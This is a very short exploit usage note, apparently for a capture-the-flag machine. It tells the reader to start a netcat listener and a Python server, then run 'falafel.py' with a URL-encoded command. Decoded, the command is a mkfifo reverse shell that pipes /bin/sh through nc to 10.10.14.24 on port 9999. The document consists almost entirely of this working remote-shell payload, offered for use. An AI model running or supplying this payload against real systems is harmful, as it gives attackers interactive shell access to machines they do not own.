Start your netcat before and python server for your payload

```python3 falafel.py --command "rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.24%209999%20%3E%2Ftmp%2Ff"```
